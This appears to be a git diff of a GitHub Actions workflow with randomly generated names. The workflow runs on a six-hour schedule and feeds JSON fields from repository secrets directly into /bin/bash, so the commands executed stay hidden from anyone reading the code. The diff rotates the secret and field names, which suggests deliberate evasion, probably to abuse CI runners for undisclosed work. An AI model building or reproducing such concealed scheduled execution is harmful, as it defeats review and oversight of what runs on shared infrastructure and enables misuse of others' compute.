@@ -2,7 +2,8 @@ name: maoziran6798
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 4/6 * * *'
+    - cron: '26 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: maoziran6798
         env:
-          zofem041: ${{ secrets.zofem041 }}
+          fci57: ${{ secrets.fci57 }}
         run: |
-          echo $zofem041 | jq -r .lh18 | /bin/bash
-          echo $xrb319 | jq -r .bwto6 | /bin/bash
-          echo $cokn0 | jq -r .sleji45150 | /bin/bash
-          echo $f5 | jq -r .oc91820 | /bin/bash
-          echo $it59263 | jq -r .p989 | /bin/bash
-          echo $ijo398 | jq -r .fdctj1870 | /bin/bash
-          echo $ud7557 | jq -r .giail644 | /bin/bash
-          echo $zy7 | jq -r .qqno99522 | /bin/bash
+          echo $fci57 | jq -r .v3033 | /bin/bash
+          echo $thx51835 | jq -r .id56 | /bin/bash
+          echo $wshq3913 | jq -r .zauzj5 | /bin/bash
+          echo $fibdu02680 | jq -r .uaycu37 | /bin/bash
+          echo $ulzrk8 | jq -r .bcvw13 | /bin/bash
+          echo $lgfwl79 | jq -r .udn870 | /bin/bash
+          echo $mdyr10 | jq -r .a937 | /bin/bash
+          echo $c00535 | jq -r .gt1 | /bin/bash
+          echo $wnyt01 | jq -r .xmp19 | /bin/bash
+          echo $b0 | jq -r .ol73 | /bin/bash
+          echo $dnnh0 | jq -r .cxd52 | /bin/bash
+          echo $rtph90660 | jq -r .pudw70217 | /bin/bash
 
